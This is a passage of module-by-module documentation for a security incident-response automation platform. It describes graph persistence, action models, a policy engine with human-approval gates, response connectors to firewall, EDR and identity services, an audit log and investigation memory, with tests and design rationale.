campaign = {"campaign_id": "test-123", "name": "Test Campaign"}
events = [{"event_id": "1", "host": "srv01"}]
techniques = [{"technique_id": "T1059.001", "name": "PowerShell"}]
persist_campaign(campaign, events, techniques)
```

**Expected Outputs:**
- Neo4j nodes created
- Relationships established
- No return value (side effects)

**Failure Cases:**
- Neo4j connection failure
- Invalid Cypher queries
- Missing required fields
- Neo4j authentication failure

**Edge Cases:**
- Empty campaign_id (returns early)
- Events without event_id (skipped)
- Techniques without technique_id (skipped)
- Missing evidence_event_id (relationship skipped)

**Interview Questions:**

**Q: Why use MERGE instead of CREATE?**
**A:** Idempotency. MERGE creates if doesn't exist, updates if exists. This allows re-running persistence without duplicates. It's safer for data loading operations.

**Q: Why persist to Neo4j instead of just returning campaign data?**
**A:** Relationship queries. Neo4j enables complex graph queries like "find all campaigns involving this IP" or "campaigns using this technique." JSON doesn't support these queries efficiently.

**Q: What happens if Neo4j persistence fails?**
**A:** The exception propagates. In CorrelationAgent, this is caught and logged but doesn't fail the investigation. The campaign is still returned to the workflow. This is a best-effort persistence strategy.

**Design Decisions:**

**Chosen Solution:** Neo4j with MERGE for idempotency
**Alternatives:**
- JSON file storage: Simpler, no relationship queries
- SQL database: More structured, less flexible for relationships
- NetworkX: In-memory only, no persistence
- ArangoDB: Multi-model, more complex

**Advantages:**
- Native graph database
- Relationship queries
- Idempotent operations
- Scalable for large graphs
- Cypher query language

**Disadvantages:**
- External dependency (Neo4j)
- Requires Neo4j installation
- More complex than JSON
- Resource intensive
- Learning curve for Cypher

**Weak Points:**
- No error handling in graph_builder
- No transaction management
- No batch operations
- No relationship deletion
- No node deletion
- No graph validation

**Improvements:**
- Add error handling with logging
- Implement transaction management
- Add batch operations for performance
- Add relationship deletion capability
- Add node deletion capability
- Add graph validation
- Add graph backup/restore

---

### databases/neo4j_manager.py

**Purpose:**
- Manage Neo4j driver connection
- Provide simple query execution interface
- Handle connection lifecycle

**Why it exists:**
- Centralizes Neo4j connection management
- Provides consistent query interface
- Handles driver lifecycle
- Simplifies Neo4j operations

**Problem it solves:**
- Manages Neo4j connection pool
- Provides query execution wrapper
- Handles session management
- Simplifies Neo4j usage

**Internal Workflow:**
```
Driver Initialization → Session Creation → Query Execution → Result Processing → Session Close
```

**Dependencies:**
- **Imports:** `neo4j.GraphDatabase`, `config`
- **Imported by:** `knowledge_graph.graph_builder`, graph queries
- **Calls:** None (database manager leaf node)

**Classes:**

#### `Neo4jManager`
- **Purpose:** Neo4j driver wrapper
- **Logic:** Manages driver lifecycle and query execution

**Methods:**

#### `__init__(self)`
- **Input:** None
- **Output:** None
- **Purpose:** Initialize Neo4j driver
- **Logic:** Create GraphDatabase.driver with config credentials
- **Why:** Single connection point for Neo4j

#### `close(self)`
- **Input:** None
- **Output:** None
- **Purpose:** Close driver connection
- **Logic:** Call driver.close()
- **Why:** Clean resource cleanup

#### `run_query(self, query: str, parameters: dict) -> list[dict]`
- **Input:** Cypher query string, parameters dict
- **Output:** List of result dictionaries
- **Purpose:** Execute Cypher query
- **Logic:**
  1. Default parameters to empty dict
  2. Create session from driver
  3. Run query with parameters
  4. Convert results to list of dicts
  5. Session auto-closes with context manager
- **Why:** Simplified query execution with automatic session management

#### `verify_connectivity(self) -> bool`
- **Input:** None
- **Output:** Boolean
- **Purpose:** Check Neo4j connectivity
- **Logic:** Call driver.verify_connectivity(), return True/False
- **Why:** Health check for connection

**Global Variables:**

#### `neo4j_manager`
- **Type:** Neo4jManager instance
- **Purpose:** Singleton Neo4j manager
- **Why:** Shared connection across application

**Example:**
```python
results = neo4j_manager.run_query(
    "MATCH (c:Campaign) RETURN c.name LIMIT 10"
)
# Returns: [{"c.name": "Campaign1"}, {"c.name": "Campaign2"}]

is_connected = neo4j_manager.verify_connectivity()
# Returns: True or False
```

**Testing:**

**Unit Tests:**
```python
def test_verify_connectivity():
    connected = neo4j_manager.verify_connectivity()
    assert isinstance(connected, bool)

def test_run_query():
    results = neo4j_manager.run_query("RETURN 1 as test")
    assert len(results) == 1
    assert results[0]["test"] == 1
```

**Manual Tests:**
```python
from databases.neo4j_manager import neo4j_manager

# Test connectivity
print(f"Connected: {neo4j_manager.verify_connectivity()}")

# Test query
results = neo4j_manager.run_query("MATCH (c:Campaign) RETURN count(c) as count")
print(f"Campaigns: {results}")
```

**Expected Outputs:**
- Query results as list of dicts
- Connectivity boolean

**Failure Cases:**
- Neo4j connection failure
- Invalid Cypher syntax
- Authentication failure
- Network issues

**Edge Cases:**
- Empty query results
- Large result sets
- Complex queries
- Parameterized queries

**Interview Questions:**

**Q: Why use a singleton instance instead of creating new managers?**
**A:** Connection pooling. Reusing the same driver connection is more efficient. Neo4j driver handles connection pooling internally, so the singleton provides a single access point.

**Q: Why use context manager for sessions?**
**A:** Automatic cleanup. The `with` statement ensures sessions are closed even if exceptions occur. This prevents connection leaks and resource exhaustion.

**Q: What happens if Neo4j is not running?**
**A:** verify_connectivity returns False. Query execution will raise an exception. The calling code should handle this. Currently, graph_builder doesn't handle this, which is a weak point.

**Design Decisions:**

**Chosen Solution:** Singleton manager with session context manager
**Alternatives:**
- Direct driver usage: More control, more boilerplate
- Connection pool per request: More overhead, simpler
- Async driver: Better for high concurrency, more complex
- REST API: No driver dependency, slower

**Advantages:**
- Centralized connection management
- Automatic session cleanup
- Simple interface
- Connection pooling
- Type-safe results

**Disadvantages:**
- Singleton limits flexibility
- No async support
- No query timeout configuration
- No retry logic
- No query logging

**Weak Points:**
- No retry logic for failed queries
- No query timeout
- No query logging
- No connection pool configuration
- No error handling in run_query
- No transaction management

**Improvements:**
- Add retry logic with exponential backoff
- Add query timeout configuration
- Add query logging for debugging
- Add connection pool configuration
- Add error handling with specific exceptions
- Add transaction management
- Add async support
- Add query performance metrics

---

## Action System

### actions/action_models.py

**Purpose:**
- Define data models for actions using Pydantic
- Provide type safety and validation
- Define enums for action types, severity, and status

**Why it exists:**
- Type safety prevents errors
- Pydantic validation ensures data integrity
- Enums provide consistent values
- Models document action structure

**Problem it solves:**
- Provides structured action data
- Validates action fields
- Ensures type consistency
- Documents action schema

**Internal Workflow:**
```
Action Data → Pydantic Validation → Validated Model → Usage
```

**Dependencies:**
- **Imports:** `enum`, `typing`, `pydantic`
- **Imported by:** `actions.policy`, `actions.audit_log`, `agents.response_agent`
- **Calls:** None (models leaf node)

**Classes:**

#### `ActionType(str, Enum)`
- **Purpose:** Enum of supported action types
- **Values:** BLOCK_IP, ISOLATE_HOST, DISABLE_ACCOUNT, KILL_PROCESS, QUARANTINE_FILE, NOTIFY_ANALYST
- **Why:** Standardizes action type values

#### `ActionSeverity(str, Enum)`
- **Purpose:** Enum of action severity levels
- **Values:** LOW, MEDIUM, HIGH
- **Why:** Standardizes severity values

#### `ActionStatus(str, Enum)`
- **Purpose:** Enum of action execution status
- **Values:** EXECUTED, PENDING_APPROVAL, DENIED, FAILED
- **Why:** Standardizes status values

#### `ProposedAction(BaseModel)`
- **Purpose:** Model for proposed actions from LLM
- **Fields:**
  - `action_type`: ActionType (required)
  - `target`: str (required, min_length=1)
  - `severity`: ActionSeverity (required)
  - `rationale`: str (required, min_length=5, max_length=500)
  - `technique_id`: Optional[str]
  - `confidence`: float (default=0.0, range 0.0-1.0)
- **Validators:** clean_target (strip), clean_reason (strip)
- **Why:** Validates LLM-generated actions

#### `ActionResult(BaseModel)`
- **Purpose:** Model for action execution results
- **Fields:**
  - `action`: ProposedAction (required)
  - `status`: ActionStatus (required)
  - `detail`: str (default="")
  - `dry_run`: bool (default=True)
- **Why:** Captures execution outcome

**Example:**
```python
action = ProposedAction(
    action_type=ActionType.BLOCK_IP,
    target="192.168.1.1",
    severity=ActionSeverity.HIGH,
    rationale="Malicious IP observed in C2 traffic",
    confidence=0.95
)

result = ActionResult(
    action=action,
    status=ActionStatus.EXECUTED,
    detail="Firewall rule created",
    dry_run=False
)
```

**Testing:**

**Unit Tests:**
```python
def test_proposed_action_validation():
    action = ProposedAction(
        action_type=ActionType.BLOCK_IP,
        target="192.168.1.1",
        severity=ActionSeverity.HIGH,
        rationale="Test"
    )
    assert action.target == "192.168.1.1"

def test_proposed_action_confidence_range():
    with pytest.raises(ValidationError):
        ProposedAction(
            action_type=ActionType.BLOCK_IP,
            target="192.168.1.1",
            severity=ActionSeverity.HIGH,
            rationale="Test",
            confidence=1.5  # Invalid
        )
```

**Manual Tests:**
```python
from actions.action_models import ProposedAction, ActionResult, ActionType

action = ProposedAction(
    action_type=ActionType.BLOCK_IP,
    target="192.168.1.1",
    severity=ActionSeverity.HIGH,
    rationale="Malicious IP",
    confidence=0.9
)
print(action.model_dump_json())
```

**Expected Outputs:**
- Validated action models
- Validation errors for invalid data
- JSON serialization

**Failure Cases:**
- Invalid action type
- Missing required fields
- Confidence out of range
- Rationale too short/long

**Edge Cases:**
- Empty target
- Zero confidence
- Missing technique_id
- Unicode in rationale

**Interview Questions:**

**Q: Why use Pydantic instead of plain dicts?**
**A:** Type safety and validation. Pydantic automatically validates types, ranges, and required fields. Plain dicts would require manual validation and are error-prone.

**Q: Why use enums instead of strings?**
**A:** Consistency and IDE support. Enums prevent typos and provide autocomplete. Strings can have arbitrary values leading to bugs.

**Q: Why strip target and rationale in validators?**
**A:** Data hygiene. Leading/trailing whitespace is common in LLM outputs. Stripping ensures clean data for downstream processing.

**Design Decisions:**

**Chosen Solution:** Pydantic models with enums
**Alternatives:**
- Plain dicts: Simpler, no validation
- Dataclasses: Less validation, built-in
- Custom classes: More control, more code
- JSON Schema: More complex, external

**Advantages:**
- Automatic validation
- Type safety
- IDE support
- JSON serialization
- Clear documentation

**Disadvantages:**
- Additional dependency
- Learning curve
- Slightly slower
- More boilerplate

**Weak Points:**
- No custom validation beyond basic types
- No relationship validation
- No business logic in models
- No versioning

**Improvements:**
- Add custom validators for business rules
- Add relationship validation
- Add model versioning
- Add field encryption for sensitive data
- Add model inheritance for action types

---

### actions/policy.py

**Purpose:**
- Evaluate proposed actions against security policy
- Determine if actions should auto-execute, require approval, or be denied
- Implement rate limiting and protected target checks

**Why it exists:**
- Policy engine ensures safe automation
- Prevents dangerous automated actions
- Provides guardrails for response automation
- Enables safe auto-response deployment

**Problem it solves:**
- Evaluates action safety
- Implements rate limiting
- Protects critical targets
- Provides decision logic for automation

**Internal Workflow:**
```
Proposed Action → Policy Checks → Decision → Status
```

**Dependencies:**
- **Imports:** `time`, `collections.defaultdict`, `config`, `actions.action_models`
- **Imported by:** `agents.response_agent`
- **Calls:** None (policy leaf node)

**Global Variables:**

#### `PROTECTED_TARGETS`
- **Type:** Set of strings
- **Purpose:** Targets that must never be auto-actioned
- **Values:** DC-FILESRV01, domain admin
- **Why:** Protects critical systems from automation

#### `ALWAYS_REQUIRE_APPROVAL`
- **Type:** Set of action types
- **Purpose:** Action types that always require human approval
- **Values:** Empty (none currently)
- **Why:** Future-proofing for high-risk actions

#### `MIN_AUTO_EXECUTE_CONFIDENCE`
- **Type:** Float
- **Purpose:** Minimum confidence for auto-execution
- **Value:** 0.70
- **Why:** Ensures high-confidence actions only

#### `MAX_ACTIONS_PER_TARGET_PER_HOUR`
- **Type:** Integer
- **Purpose:** Rate limit per target
- **Value:** 3
- **Why:** Prevents action spam

#### `_action_history`
- **Type:** defaultdict(list)
- **Purpose:** Track action timestamps per target
- **Why:** Implements rate limiting

**Functions:**

#### `_rate_limit_exceeded(target: str) -> bool`
- **Input:** Target string
- **Output:** Boolean
- **Purpose:** Check if rate limit exceeded for target
- **Logic:**
  1. Get current time
  2. Filter history to last hour
  3. Check if count >= max
  4. Return True/False
- **Why:** Prevents action spam

#### `evaluate(action: ProposedAction) -> str`
- **Input:** ProposedAction model
- **Output:** Status string (auto_execute, pending_approval, denied)
- **Purpose:** Evaluate action against policy
- **Logic:**
  1. If AUTO_RESPONSE_ENABLED is False, return pending_approval
  2. If target in PROTECTED_TARGETS, return denied
  3. If confidence < MIN_AUTO_EXECUTE_CONFIDENCE, return pending_approval
  4. If rate limit exceeded, return pending_approval
  5. Record action timestamp
  6. Return auto_execute
- **Why:** Multi-layered safety checks

**Example:**
```python
action = ProposedAction(
    action_type=ActionType.BLOCK_IP,
    target="192.168.1.1",
    severity=ActionSeverity.HIGH,
    rationale="Malicious IP",
    confidence=0.95
)
status = evaluate(action)
# Returns: "auto_execute" (if AUTO_RESPONSE_ENABLED=True)

action.target = "DC-FILESRV01"
status = evaluate(action)
# Returns: "denied" (protected target)
```

**Testing:**

**Unit Tests:**
```python
def test_evaluate_auto_execute():
    action = ProposedAction(
        action_type=ActionType.BLOCK_IP,
        target="192.168.1.1",
        severity=ActionSeverity.HIGH,
        rationale="Test",
        confidence=0.9
    )
    status = evaluate(action)
    assert status == "auto_execute"

def test_evaluate_protected_target():
    action = ProposedAction(
        action_type=ActionType.ISOLATE_HOST,
        target="DC-FILESRV01",
        severity=ActionSeverity.HIGH,
        rationale="Test",
        confidence=0.9
    )
    status = evaluate(action)
    assert status == "denied"

def test_evaluate_low_confidence():
    action = ProposedAction(
        action_type=ActionType.BLOCK_IP,
        target="192.168.1.1",
        severity=ActionSeverity.HIGH,
        rationale="Test",
        confidence=0.5
    )
    status = evaluate(action)
    assert status == "pending_approval"
```

**Manual Tests:**
```python
from actions.policy import evaluate
from actions.action_models import ProposedAction, ActionType, ActionSeverity

action = ProposedAction(
    action_type=ActionType.BLOCK_IP,
    target="192.168.1.1",
    severity=ActionSeverity.HIGH,
    rationale="Test",
    confidence=0.9
)
print(f"Status: {evaluate(action)}")
```

**Expected Outputs:**
- auto_execute: Action passes all checks
- pending_approval: Action requires human review
- denied: Action blocked by policy

**Failure Cases:**
- Invalid action model
- Missing confidence field
- Rate limit tracking errors

**Edge Cases:**
- Confidence exactly at threshold
- Target not in protected list
- Rate limit exactly at max
- AUTO_RESPONSE_ENABLED=False

**Interview Questions:**

**Q: Why have multiple policy checks instead of just confidence?**
**A:** Defense in depth. Confidence alone isn't enough. Protected targets prevent critical system actions. Rate limiting prevents spam. Kill switch provides emergency stop. Multiple layers provide comprehensive safety.

**Q: Why is the rate limit per target instead of global?**
**A:** Target-specific limits. A single malicious IP might trigger many actions, but that's appropriate. Rate limiting per target prevents spam against a single target while allowing legitimate actions against multiple targets.

**Q: What happens if AUTO_RESPONSE_ENABLED is False?**
**A:** All actions return pending_approval. This is a global kill switch. Even high-confidence actions require human approval when the kill switch is off.

**Design Decisions:**

**Chosen Solution:** Multi-layered policy with rate limiting
**Alternatives:**
- Confidence only: Simpler, less safe
- Rule-based engine: More complex, more flexible
- ML-based policy: More adaptive, requires training
- External policy service: More scalable, external dependency

**Advantages:**
- Multiple safety layers
- Simple implementation
- No external dependencies
- Easy to understand
- Fast execution

**Disadvantages:**
- Fixed thresholds
- No context awareness
- No learning from history
- No dynamic adjustment
- Protected targets hardcoded

**Weak Points:**
- No protected target management
- No dynamic thresholds
- No context-aware policy
- No policy versioning
- No policy audit trail
- No policy exceptions

**Improvements:**
- Add protected target management (database)
- Implement dynamic thresholds
- Add context-aware policy (time of day, asset criticality)
- Add policy versioning and rollback
- Add policy audit trail
- Add policy exception workflow
- Add policy testing framework

---

### actions/connectors.py

**Purpose:**
- Implement external API connectors for response actions
- Execute actions via firewall, EDR, IAM, and notification systems
- Provide dry-run mode for testing
- Handle API errors and retries

**Why it exists:**
- Automates incident response actions
- Integrates with security infrastructure
- Provides consistent action execution
- Enables safe testing with dry-run mode

**Problem it solves:**
- Executes automated response actions
- Integrates with multiple security tools
- Handles API authentication and errors
- Provides audit trail for actions

**Internal Workflow:**
```
Action Request → Dry Run Check → Connector Selection → API Call → Retry Logic → Result Logging
```

**Dependencies:**
- **Imports:** `logging`, `os`, `base64`, `json`, `requests`, `config`
- **Imported by:** `agents.response_agent`
- **Calls:** External APIs (firewall, Wazuh, Azure, Okta, CrowdStrike, SentinelOne, Slack)

**Functions:**

#### `_log_action(action_type: str, target: str, detail: str) -> str`
- **Input:** Action type, target, detail
- **Output:** Log message string
- **Purpose:** Log action execution
- **Logic:** Prefix with [DRY RUN] or [EXECUTED], log and return message
- **Why:** Provides audit trail

#### `_post_with_retry(url: str, **kwargs) -> requests.Response`
- **Input:** URL, request kwargs
- **Output:** Response object
- **Purpose:** HTTP POST with retry logic
- **Logic:**
  1. Set default timeout
  2. Retry up to API_RETRY times on transient failures
  3. Raise last exception if all retries fail
- **Why:** Handles network failures gracefully

#### `block_ip(ip_address: str) -> str`
- **Input:** IP address string
- **Output:** Log message
- **Purpose:** Block IP via firewall API
- **Logic:**
  1. Return dry-run log if DRY_RUN=True
  2. Check firewall API configuration
  3. Build deny rule payload
  4. Call firewall API with retry
  5. Log response
  6. Return log message
- **Why:** Automated IP blocking
- **API:** Generic firewall API (configurable for Palo Alto, Fortinet, AWS)

#### `isolate_host(hostname: str) -> str`
- **Input:** Hostname string
- **Output:** Log message
- **Purpose:** Isolate host via Wazuh Active Response
- **Logic:**
  1. Return dry-run log if DRY_RUN=True
  2. Check Wazuh API configuration
  3. Get agent ID by hostname
  4. Send isolate-host active response
  5. Log response
  6. Return log message
- **Why:** Automated host isolation
- **API:** Wazuh API v4.x

#### `disable_account(username: str) -> str`
- **Input:** Username string
- **Output:** Log message
- **Purpose:** Disable account via IAM (Azure AD or Okta)
- **Logic:**
  1. Return dry-run log if DRY_RUN=True
  2. Check Azure AD or Okta configuration
  3. For Azure: Get token, find user, disable account
  4. For Okta: Find user, deactivate user
  5. Return log message
- **Why:** Automated account disabling
- **APIs:** Microsoft Graph API (Azure AD), Okta API

#### `kill_process(process_ref: str) -> str`
- **Input:** Process reference (PID or name)
- **Output:** Log message
- **Purpose:** Kill process via Wazuh Active Response
- **Logic:**
  1. Return dry-run log if DRY_RUN=True
  2. Check Wazuh API configuration
  3. Send kill-process active response
  4. Log response
  5. Return log message
- **Why:** Automated process termination
- **API:** Wazuh API v4.x

#### `quarantine_file(file_hash: str) -> str`
- **Input:** File hash (MD5, SHA1, SHA256)
- **Output:** Log message
- **Purpose:** Quarantine file via EDR (CrowdStrike, SentinelOne, or Wazuh)
- **Logic:**
  1. Return dry-run log if DRY_RUN=True
  2. Check EDR configuration (CrowdStrike, SentinelOne, or Wazuh)
  3. For CrowdStrike: Get token, quarantine by hash
  4. For SentinelOne: Quarantine by hash
  5. For Wazuh: Send quarantine-file active response
  6. Return log message
- **Why:** Automated file quarantine
- **APIs:** CrowdStrike Falcon API, SentinelOne API, Wazuh API

#### `notify_analyst(message: str) -> str`
- **Input:** Message string
- **Output:** Log message
- **Purpose:** Send notification via Slack webhook
- **Logic:**
  1. Return dry-run log if DRY_RUN=True
  2. Check Slack webhook configuration
  3. Send message to webhook
  4. Return log message
- **Why:** Analyst notification
- **API:** Slack Incoming Webhook

**Global Variables:**

#### `ACTION_DISPATCH`
- **Type:** Dictionary
- **Purpose:** Maps action types to connector functions
- **Mapping:** block_ip, isolate_host, disable_account, kill_process, quarantine_file, notify_analyst
- **Why:** Enables dynamic action dispatch

**Example:**
```python
# Block IP
result = block_ip("192.168.1.1")
# Returns: "[EXECUTED] BLOCK_IP -> 192.168.1.1 (firewall rule created)"

# Isolate host
result = isolate_host("srv01")
# Returns: "[EXECUTED] ISOLATE_HOST -> srv01 (isolation triggered for agent 001)"

# Disable account
result = disable_account("malicious.user")
# Returns: "[EXECUTED] DISABLE_ACCOUNT -> malicious.user (account disabled in Azure AD)"
```

**Testing:**

**Unit Tests:**
```python
def test_block_ip_dry_run():
    original_dry_run = config.DRY_RUN
    config.DRY_RUN = True
    result = block_ip("192.168.1.1")
    assert "[DRY RUN]" in result
    config.DRY_RUN = original_dry_run

def test_notify_analyst():
    result = notify_analyst("Test message")
    assert "NOTIFY_ANALYST" in result
```

**Manual Tests:**
```python
from actions.connectors import block_ip, isolate_host

# Test in dry-run mode
result = block_ip("192.168.1.1")
print(result)
```

**Expected Outputs:**
- Log messages with action details
- Success or failure indicators
- API response details

**Failure Cases:**
- API authentication failure
- Network timeout
- Invalid target (agent not found, user not found)
- API rate limiting

**Edge Cases:**
- DRY_RUN mode
- Missing API configuration
- Multiple EDR/IAM providers configured
- Long-running API calls

**Interview Questions:**

**Q: Why support multiple EDR/IAM providers?**
**A:** Flexibility. Different organizations use different tools. Supporting multiple providers (CrowdStrike, SentinelOne, Azure AD, Okta) makes the system adaptable to different environments.

**Q: Why use retry logic for API calls?**
**A:** Resilience. Network failures and temporary API errors are common. Retry logic with exponential backoff handles transient failures without failing the entire investigation.

**Q: Why have dry-run mode?**
**A:** Safe testing. Dry-run mode allows testing the entire workflow without actually executing actions. This is critical for development, testing, and initial deployment.

**Design Decisions:**

**Chosen Solution:** Multiple connector implementations with retry logic
**Alternatives:**
- Single connector: Less flexible, simpler
- Plugin system: More flexible, more complex
- External orchestrator: More scalable, external dependency
- No connectors: Manual response only

**Advantages:**
- Multiple provider support
- Retry logic for resilience
- Dry-run mode for safety
- Comprehensive logging
- Error handling

**Disadvantages:**
- Complex implementation
- Many API dependencies
- Configuration overhead
- Maintenance burden
- Testing complexity

**Weak Points:**
- No connector health checks
- No connector fallback
- No connector performance monitoring
- No connector versioning
- No connector testing framework
- No connector configuration validation

**Improvements:**
- Add connector health checks
- Implement connector fallback (try alternate provider)
- Add performance monitoring
- Add connector versioning
- Add connector testing framework
- Add configuration validation
- Add connector-specific retry policies
- Add connector metrics dashboard

---

### actions/audit_log.py

**Purpose:**
- Record all response actions to audit log
- Provide persistent action history
- Enable action review and compliance
- Support pending approval queries

**Why it exists:**
- Audit trail is critical for accountability
- Compliance requires action logging
- Enables post-incident review
- Supports approval workflow

**Problem it solves:**
- Provides persistent action history
- Enables compliance reporting
- Supports approval workflow queries
- Provides audit trail for investigations

**Internal Workflow:**
```
Action Result → Format Entry → Append to Log File → Return
```

**Dependencies:**
- **Imports:** `json`, `logging`, `pathlib.Path`, `datetime`, `typing`, `actions.action_models`
- **Imported by:** `agents.response_agent`
- **Calls:** None (file I/O)

**Global Variables:**

#### `AUDIT_LOG_PATH`
- **Type:** Path
- **Purpose:** Path to audit log file
- **Value:** ./data/action_audit_log.jsonl
- **Why:** Centralized audit log location

**Functions:**

#### `record(result: ActionResult, campaign_id: str) -> None`
- **Input:** ActionResult, optional campaign_id
- **Output:** None
- **Purpose:** Save action to audit log
- **Logic:**
  1. Create data directory if needed
  2. Format entry with timestamp, action details, status
  3. Append JSON line to log file
  4. Log success or failure
- **Why:** Persistent audit trail
- **Format:** JSONL (one JSON per line)

#### `read_pending_approvals() -> List[Dict]`
- **Input:** None
- **Output:** List of pending action entries
- **Purpose:** Query pending approval actions
- **Logic:**
  1. Return empty if log doesn't exist
  2. Read all lines from log
  3. Parse each line as JSON
  4. Filter for status == pending_approval
  5. Return pending entries
- **Why:** Support approval workflow

#### `read_all() -> List[Dict]`
- **Input:** None
- **Output:** List of all action entries
- **Purpose:** Query all recorded actions
- **Logic:**
  1. Return empty if log doesn't exist
  2. Read all lines from log
  3. Parse each line as JSON
  4. Return all entries
- **Why:** Support audit review

**Example:**
```python
# Record action
result = ActionResult(
    action=proposed_action,
    status=ActionStatus.EXECUTED,
    detail="Firewall rule created"
)
record(result, campaign_id="uuid-123")

# Query pending
pending = read_pending_approvals()
# Returns: List of pending action entries

# Query all
all_actions = read_all()
# Returns: List of all action entries
```

**Testing:**

**Unit Tests:**
```python
def test_record_action():
    result = ActionResult(
        action=proposed_action,
        status=ActionStatus.EXECUTED,
        detail="Test"
    )
    record(result, "test-campaign")
    # Verify file created

def test_read_pending_approvals():
    pending = read_pending_approvals()
    assert isinstance(pending, list)

def test_read_all():
    all_actions = read_all()
    assert isinstance(all_actions, list)
```

**Manual Tests:**
```python
from actions.audit_log import record, read_all, read_pending_approvals
from actions.action_models import ActionResult, ProposedAction, ActionType, ActionSeverity, ActionStatus

action = ProposedAction(
    action_type=ActionType.BLOCK_IP,
    target="192.168.1.1",
    severity=ActionSeverity.HIGH,
    rationale="Test"
)
result = ActionResult(
    action=action,
    status=ActionStatus.EXECUTED,
    detail="Test"
)
record(result, "test")
print(f"Pending: {len(read_pending_approvals())}")
print(f"Total: {len(read_all())}")
```

**Expected Outputs:**
- JSONL file with action entries
- List of pending actions
- List of all actions

**Failure Cases:**
- File write permission errors
- JSON serialization errors
- File read permission errors
- Corrupted log entries

**Edge Cases:**
- Empty log file
- Corrupted log entries (skipped)
- Very large log file
- Concurrent writes

**Interview Questions:**

**Q: Why use JSONL instead of JSON array?**
**A:** Append efficiency. JSONL (one JSON per line) allows appending without reading the entire file. JSON arrays require reading, parsing, and rewriting the entire file for each append.

**Q: What happens if the audit log file is corrupted?**
**A:** Corrupted lines are skipped during read operations. The corrupted line is logged as a warning. This ensures the rest of the log is still readable.

**Q: Why store campaign_id in the audit log?**
**A:** Traceability. Linking actions to campaigns enables post-incident analysis and reporting. Analysts can query all actions for a specific campaign.

**Design Decisions:**

**Chosen Solution:** JSONL file-based audit log
**Alternatives:**
- Database storage: More scalable, more complex
- JSON array: Simpler read, harder append
- Syslog: Standard logging, less structured
- External audit service: More features, external dependency

**Advantages:**
- Simple implementation
- No external dependencies
- Easy to read manually
- Append-efficient
- Human-readable

**Disadvantages:**
- File-based (not scalable)
- No query capabilities
- No indexing
- No backup mechanism
- No encryption

**Weak Points:**
- No log rotation
- No backup mechanism
- No encryption
- No query capabilities
- No log aggregation
- No retention policy

**Improvements:**
- Add log rotation
- Implement backup mechanism
- Add encryption for sensitive data
- Add query capabilities (search, filter)
- Add log aggregation to SIEM
- Add retention policy
- Add log compression
- Add log integrity verification

---

## Memory System

### memory/investigation_memory.py

**Purpose:**
- Persist investigation state snapshots
- Provide historical investigation data
- Enable debugging and analysis
- Support investigation replay

**Why it exists:**
- Investigation state is valuable for analysis
- Historical data enables trend analysis
- Debugging requires state snapshots
- Compliance may require investigation history

**Problem it solves:**
- Provides persistent investigation storage
- Enables post-investigation review
- Supports debugging and analysis
- Maintains investigation history

**Internal Workflow:**
```
State Snapshot → Append to Records → Save to File → Load on Demand
```

**Dependencies:**
- **Imports:** `json`, `os`, `typing`
- **Imported by:** `investigation_service`
- **Calls:** None (file I/O)

**Global Variables:**

#### `MEMORY_FILE`
- **Type:** String
- **Purpose:** Path to investigation memory file
- **Value:** ./data/investigation_memory.json
- **Why:** Centralized memory location

**Classes:**

#### `InvestigationMemory`
- **Purpose:** Manages investigation state persistence
- **Logic:** Loads, saves, and queries investigation records

**Methods:**

#### `__init__(self, path: str)`
- **Input:** File path (optional, defaults to MEMORY_FILE)
- **Output:** None
- **Purpose:** Initialize memory with file path
- **Logic:** Store path, load existing records
- **Why:** Flexible path configuration

#### `_load(self) -> List[Dict]`
- **Input:** None
- **Output:** List of investigation records
- **Purpose:** Load records from file
- **Logic:**
  1. Return empty list if file doesn't exist
  2. Load JSON from file
  3. Return records
- **Why:** Lazy loading of historical data

#### `save(self, state_snapshot: Dict)`
- **Input:** Investigation state dictionary
- **Output:** None
- **Purpose:** Save investigation snapshot
- **Logic:**
  1. Append snapshot to records
  2. Create directory if needed
  3. Write records to file with indentation
- **Why:** Persistent storage with append pattern

#### `recent(self, n: int) -> List[Dict]`
- **Input:** Number of recent records
- **Output:** List of recent investigation records
- **Purpose:** Query recent investigations
- **Logic:** Return last n records
- **Why:** Quick access to recent history

**Global Variables:**

#### `investigation_memory`
- **Type:** InvestigationMemory instance
- **Purpose:** Singleton memory instance
- **Why:** Shared memory across application

**Example:**
```python
# Save investigation state
state = {"campaign_id": "uuid-123", "events": [...], "techniques": [...]}
investigation_memory.save(state)

# Query recent investigations
recent = investigation_memory.recent(5)
# Returns: List of last 5 investigation states
```

**Testing:**

**Unit Tests:**
```python
def test_save_investigation():
    state = {"campaign_id": "test", "events": []}
    investigation_memory.save(state)
    assert len(investigation_memory._records) > 0

def test_recent():
    for i in range(10):
        investigation_memory.save({"campaign_id": f"test-{i}"})
    recent = investigation_memory.recent(3)
    assert len(recent) == 3
```

**Manual Tests:**
```python
from memory.investigation_memory import investigation_memory

state = {"campaign_id": "test-123", "events": []}
investigation_memory.save(state)
print(f"Recent: {investigation_memory.recent(1)}")
```

**Expected Outputs:**
- JSON file with investigation records
- List of recent investigations

**Failure Cases:**
- File write permission errors
- JSON serialization errors
- Invalid state structure

**Edge Cases:**
- Empty state snapshot
- Very large state snapshots
- Corrupted memory file
- Concurrent writes

**Interview Questions:**

**Q: Why append instead of overwrite?**
**A:** History preservation. Appending maintains all investigation history. Overwriting would lose previous investigations. History is valuable for trend analysis and compliance.

**Q: Why use JSON instead of a database?**
**A:** Simplicity. JSON is sufficient for current scale. A database would add complexity without significant benefit for the current use case. Can migrate to database if scale requires it.

**Q: What happens if the memory file is corrupted?**
**A:** The JSON load will fail. There's no error handling in _load(). This is a weak point. An improvement would be to add error handling and backup files.

**Design Decisions:**

**Chosen Solution:** JSON file with append pattern
**Alternatives:**
- Database storage: More scalable, more complex
- JSONL: Append-efficient, less readable
- Pickle: Faster, less readable
- SQLite: More structured, more complex

**Advantages:**
- Simple implementation
- Human-readable
- No external dependencies
- Easy to debug
- Append pattern preserves history

**Disadvantages:**
- File-based (not scalable)
- No query capabilities
- No indexing
- No backup mechanism
- Entire file loaded into memory

**Weak Points:**
- No error handling for corrupted files
- No backup mechanism
- No file rotation
- No compression
- No encryption
- No query capabilities

**Improvements:**
- Add error handling with backup files
- Implement file rotation
- Add compression for old records
- Add encryption for sensitive data
- Add query capabilities (search, filter)
- Add memory cleanup/retention policy

---

## Telemetry Parsers

### telemetry/suricata_parser.py

**Purpose:**
- Parse Suricata EVE JSON alert logs
- Convert to platform event format
- Filter for alert events only

**Why it exists:**
- Suricata is a common IDS
- EVE JSON is standard output format
- Normalizes Suricata events for analysis
- Filters noise (non-alert events)

**Problem it solves:**
- Converts Suricata logs to platform format
